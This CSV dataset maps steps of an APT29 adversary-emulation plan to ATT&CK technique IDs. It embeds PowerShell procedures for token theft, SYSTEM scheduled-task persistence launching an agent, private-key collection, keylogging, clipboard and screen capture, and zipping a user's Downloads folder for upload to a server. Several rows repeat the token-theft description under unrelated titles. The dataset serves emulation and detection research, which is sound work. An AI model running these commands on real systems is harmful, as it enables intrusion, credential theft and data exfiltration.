org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::71,71,Access Token Manipulation,"id: 03afada1-1714-408f-bde5-f528b91dc89d | name: Access Token Manipulation | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134 | name: Access Token Manipulation | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 5.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
 | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.10 | server: description: IP or Hostname of server | type: string | default: 127.0.0.1 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
","[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::72,72,Access Token Manipulation,attack_id: T1134 | name: Access Token Manipulation,"[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::73,73,Credentials In Files- Chrome,"id: e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d | name: Credentials In Files- Chrome | description: Obtain credentials from Chrome Dumper | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 6.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
./accesschk.exe -accepteula .;
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
./accesschk.exe -accepteula .;
","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::74,74,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::75,75,Query Registry,"id: 1b9e018d-986d-42d9-bb8b-0e104e98ce9c | name: Query Registry | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134 | name: Access Token Manipulation | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 6.A.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
 | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
","[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::76,76,Access Token Manipulation,attack_id: T1134 | name: Access Token Manipulation,"[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::77,77,Credentials In Files (T1081) - Private Keys Extraction,"id: c4f4b13c-87b6-498c-b814-93570173068c | name: Credentials In Files (T1081) - Private Keys Extraction | description: Obtain credentials via Custom PowerShell | tactic: credential-access | technique: attack_id: T1552.004 | name: Unsecured Credentials: Private Keys | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 6.B | platforms: windows: psh,pwsh: command: Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;

if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\readme.ps1;
Get-PrivateKeys;
if ($? -eq $True) {
    write-host ""[+] Successfully executed private key collection script."";
    exit 0;
} else {
    write-host ""[!] Error, could not execution Get-PrivateKeys."";
    exit 1;
}
 | payloads: dmevals.local.pfx | executors: name: powershell | command: Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;

if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\readme.ps1;
Get-PrivateKeys;
if ($? -eq $True) {
    write-host ""[+] Successfully executed private key collection script."";
    exit 0;
} else {
    write-host ""[!] Error, could not execution Get-PrivateKeys."";
    exit 1;
}
","[""T1081"", ""T1552.004""]","[""T1081"", ""T1552""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::78,78,Unsecured Credentials: Private Keys,attack_id: T1552.004 | name: Unsecured Credentials: Private Keys,"[""T1552.004""]","[""T1552""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::79,79,Staging files for PowerShell module imports,"id: a4b14c10-49aa-4ae4-b165-d5a37364fe62 | name: Staging files for PowerShell module imports | description: Renaming psversion.txt to psversion.txt to be imported | tactic: defensive-evasion | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_def_evasion | procedure_step: 7.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (test-path -path "".\psversion.txt"" ) {
  move-item .\psversion.txt psversion.ps1 -Force;
}
  write-host ""[+] File psversion.ps1 staged to be imported.""
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (test-path -path "".\psversion.txt"" ) {
  move-item .\psversion.txt psversion.ps1 -Force;
}
  write-host ""[+] File psversion.ps1 staged to be imported.""
","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::80,80,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::81,81,Screen Capturing,"id: a81ea4ad-bc9f-49a7-82d4-4466df641487 | name: Screen Capturing | description: Load custom PowerShell module and take screenshots. | tactic: collection | technique: attack_id: T1113 | name: Screen Capture | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_collection | procedure_step: 7.A.2 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";
","[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::82,82,Screen Capture,attack_id: T1113 | name: Screen Capture,"[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::83,83,Automated Collection (T1119) - Clipboard (T1115),"id: ee4c2eab-be57-434c-a32c-14b77360301a | name: Automated Collection (T1119) - Clipboard (T1115) | description: Get contents of clipboard | tactic: collection | technique: attack_id: T1115 | name: Clipboard Data | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 7.A.3 | platforms: windows: psh,pwsh: command: $clip_data=get-clipboard;
if ($clip_data.Length -gt 0) {
  write-host ""[+] Clipboard data obtained!\n"";
  write-host $clip_data;
} else {
  write-host ""[!] No clipboard data available!\n"";
}
 | executors: name: powershell | command: $clip_data=get-clipboard;
if ($clip_data.Length -gt 0) {
  write-host ""[+] Clipboard data obtained!\n"";
  write-host $clip_data;
} else {
  write-host ""[!] No clipboard data available!\n"";
}
","[""T1115"", ""T1119""]","[""T1115"", ""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::84,84,Clipboard Data,attack_id: T1115 | name: Clipboard Data,"[""T1115""]","[""T1115""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::85,85,Automated Collection (T1119) - Input Capture (T1417),"id: db28f68d-e8b8-46e6-b680-642570d4b257 | name: Automated Collection (T1119) - Input Capture (T1417) | description: Load custom PowerShell module, and grab keystrokes for 15 seconds. | tactic: collection | technique: attack_id: T1056.001 | name: Input Capture: Keylogging | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 7.A.4 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName ""Keystrokes"";
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName ""Keystrokes"";
","[""T1056.001"", ""T1119"", ""T1417""]","[""T1056"", ""T1119"", ""T1417""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::86,86,Input Capture: Keylogging,attack_id: T1056.001 | name: Input Capture: Keylogging,"[""T1056.001""]","[""T1056""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::87,87,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),"id: a612311d-a802-48da-bb7f-88a4b9dd7a24 | name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) | description: Compress all data within Download directory and exfiltrate the results. | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 7.B.1 | platforms: windows: psh,pwsh: command: Write-Host ""[*] Compressing all the things in download dir"";
Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";

Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
if ($?) {
  write-host ""[+] Data exfil of download directory completed!"";
} else {
  write-host ""[!] Data exfil failed!"";
}
 | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Write-Host ""[*] Compressing all the things in download dir"";
Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";

Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
if ($?) {
  write-host ""[+] Data exfil of download directory completed!"";
} else {
  write-host ""[!] Data exfil failed!"";
}
","[""T1041"", ""T1074""]","[""T1041"", ""T1074""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::88,88,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::89,89,Remote File Copy (T1105),"id: 9b518cfb-125f-466e-872b-4f8171773ce5 | name: Remote File Copy (T1105) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 7.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
 | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
","[""T1105"", ""T1134.001""]","[""T1105"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::90,90,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::91,91,Scheduled Tasks (T1053),"id: 6b90da47-13d0-48fc-8f07-0a1e6d5d876e | name: Scheduled Tasks (T1053) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 7.C.1 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
 | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
","[""T1053"", ""T1134.001""]","[""T1053"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::92,92,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::93,93,Remote System Discovery (T1018),"id: 95564347-e77a-4a89-b08f-dcafa5468f2c | name: Remote System Discovery (T1018) | description: Custom PowerShell script to perform AD triage for domain bound computers. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_execution | procedure_step: 8.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Ad-Search Computer Name *;
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Ad-Search Computer Name *;
","[""T1018"", ""T1059.001""]","[""T1018"", ""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::94,94,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::95,95,Identifying current user on other machines,"id: c4a59e39-53b0-4ace-9528-8ff052752ece | name: Identifying current user on other machines | description: Custom PowerShell script to perform AD triage for domain bound computers. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_execution | procedure_step: 8.A.2 | platforms: windows: psh: command: Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
 | executors: name: powershell | command: Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::96,96,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::97,97,File and Directory Discovery (T1083),"id: 9fefcde6-083a-4440-8eca-dc03d30c0bcb | name: File and Directory Discovery (T1083) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 8.A.3 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
 | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;
","[""T1083"", ""T1134.001""]","[""T1083"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::98,98,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
